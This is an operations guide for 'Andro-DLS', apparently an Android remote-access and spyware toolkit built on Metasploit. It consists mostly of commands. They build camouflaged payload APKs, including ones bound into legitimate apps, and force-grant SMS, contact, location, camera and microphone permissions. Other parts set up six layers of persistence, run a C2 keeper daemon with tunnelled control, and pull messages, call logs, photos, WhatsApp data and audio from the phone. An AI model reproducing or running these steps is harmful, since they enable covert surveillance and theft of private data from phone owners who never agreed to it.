# Andro-DLS — Operations Guide

## Quick Start

```bash
# 1. Install dependencies
bash install.sh --yes

# 2. Connect device (USB or WiFi)
adb devices
adb tcpip 5555
adb connect <PHONE_IP>:5555

# 3. Build agent payload
bash build_payload_enhanced.sh --agent --camo --fgs <YOUR_LAN_IP> 4445 payload.apk

# 4. Install + grant all permissions
./deploy_agent.sh payload.apk

# 5. Start toolkit
python3 androdls.py
```

## Architecture

```
┌──────────────┐       TCP:4445        ┌───────────────┐
│  Android     │  ──────────────────►  │   Keeper      │
│  Agent       │    __DLS_AGENT__      │   Daemon      │
│  (6-layer)   │    magic handshake    │   (24/7)      │
└──────────────┘                       └───────┬───────┘
                                               │
                                        Unix Socket
                                               │
                                        ┌──────▼───────┐
                                        │  CLI / Exec  │
                                        │  Commands    │
                                        └──────────────┘
```

## 6-Layer Persistence

| Layer | Trigger | When it fires |
|-------|---------|---------------|
| 1. BootReceiver | BOOT_COMPLETED, REBOOT, QUICKBOOT_POWERON | Device boot/reboot |
| 2. UserPresentReceiver | USER_PRESENT, USER_UNLOCKED | User unlocks screen |
| 3. PowerReceiver | POWER_CONNECTED, POWER_DISCONNECTED | Phone plugged/unplugged |
| 4. WatchdogReceiver | AlarmManager (15-min heartbeat) | Every 15 min, self-rearming |
| 5. ResurrectionJob | JobScheduler (persisted, 15-min) | Every 15 min, survives Doze |
| 6. DlsService | START_STICKY + NetworkCallback | Android restarts if killed + network comes up |

## Build Commands

```bash
# Pure build (no msfvenom — most stealthy)
bash build_agent_pure.sh <LHOST> <LPORT> [output.apk]

# Enhanced build (msfvenom base + 6-layer injection)
bash build_payload_enhanced.sh --agent --camo --fgs <LHOST> <LPORT> [output.apk]

# Bind with legitimate APK
bash build_payload_enhanced.sh --agent --camo --fgs --bind legitimate.apk <LHOST> <LPORT> [output.apk]
```

## Deploy Commands

```bash
# One-command deploy (install + grant all permissions + launch)
./deploy_agent.sh payload.apk

# Manual deploy
adb install -r payload.apk
for p in READ_SMS SEND_SMS READ_CONTACTS READ_CALL_LOG ACCESS_FINE_LOCATION \
         ACCESS_COARSE_LOCATION ACCESS_BACKGROUND_LOCATION CAMERA RECORD_AUDIO \
         READ_PHONE_STATE POST_NOTIFICATIONS; do
    adb shell pm grant com.metasploit.stage android.permission.$p
done
adb shell dumpsys deviceidle whitelist +com.metasploit.stage
adb shell am startservice -n com.metasploit.stage/.MainService
adb shell am start -n com.metasploit.stage/.MainActivity
```

## Keeper Management

```bash
# Start keeper
python3 modules/keeper.py daemon

# Check status
python3 modules/keeper.py status

# Interactive shell
python3 modules/keeper.py attach

# Stop
python3 modules/keeper.py stop
```

## Data Access (via ADB)

```bash
# Screenshot
adb shell screencap -p /data/local/tmp/s.png && adb pull /data/local/tmp/s.png

# SMS
adb shell "content query --uri content://sms --projection _id,address,body,date --sort 'date DESC' | head -60"

# Contacts
adb shell "content query --uri content://contacts/phones --projection display_name,number | head -60"

# Call logs
adb shell "content query --uri content://call_log/calls --projection number,type,date,duration | head -40"

# Location
adb shell "dumpsys location"

# Files
adb shell "ls /sdcard/"
adb pull /sdcard/DCIM/Camera/ ./Downloaded-Files/

# Installed apps
adb shell "pm list packages -3"

# App data (needs root for most)
adb shell "run-as com.whatsapp ls /data/data/com.whatsapp/"

# Camera (launch camera app)
adb shell "am start -a android.media.action.IMAGE_CAPTURE"

# Audio record
adb shell "screenrecord --audio-source=mic /data/local/tmp/record.mp4" && adb pull /data/local/tmp/record.mp4

# Network snapshot
adb shell "ifconfig && netstat -an"

# Device info
adb shell "getprop | grep -E 'product|build|version|hardware'"
```

## Data Access (via Internet/Agent C2)

When device is NOT on same LAN (connected via portmap tunnel):

```bash
# From CLI: python3 androdls.py → Option 2 → Pentest Menu → Internet Control

# Or directly via modules/internet_ctrl.py:
# - screenshot() — captures via agent, base64 transfers
# - sms_dump() — content query over agent shell
# - contacts_dump() — same
# - call_log_dump() — same
# - apps_list() — pm list packages
# - sysinfo() — getprop + id
# - battery() — dumpsys battery
# - location() — dumpsys location
# - pull_file(remote, dest) — base64 transfer
# - send_sms(number, text) — via intent
# - open_url(url) — via intent
```

## Reconnect Procedures

**Device on same network:**
```bash
adb connect <PHONE_IP>:5555
adb shell am startservice -n com.metasploit.stage/.MainService
```

**Device on different network (via tunnel):**
- Agent auto-reconnects with backoff (5s-60s cycle)
- Just wait — the keeper holds the session
- If session drops: `python3 modules/keeper.py wake`

**Agent was killed:**
- Will auto-restart via one of 6 persistence layers
- Or manually: `adb shell am startservice -n com.metasploit.stage/.MainService`

## Test Suite

```bash
# Full automated test (requires running emulator)
bash test_emulator.sh
```

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| Agent not connecting | Check `adb logcat | grep -i meta` for crashes |
| Keeper shows "session: idle" | Agent not launched — run `am startservice` |
| Commands time out | Agent process died — check logcat |
| Permission denied on content query | Run `pm grant` for specific permission |
| APK won't install | Check `targetSdkVersion` — must be ≤ device API |
| Agent killed by battery | Add to whitelist: `dumpsys deviceidle whitelist +PKG` |
| Emulator crashes headless | Use `-gpu off` flag, increase memory |

## Package Structure

```
agent/              Java source (AgentCore, services, receivers)
modules/            Python toolkit (CLI, keeper, tunnel, tools)
payload/            Alt HTTP agent + C2 server (development)
pipeline/           Metasploit handler configs
docs/               Documentation + images
landing/            Website (Next.js)
build_*.sh          Build scripts
deploy_agent.sh     Install + permission grant script
test_emulator.sh    Automated test suite
```
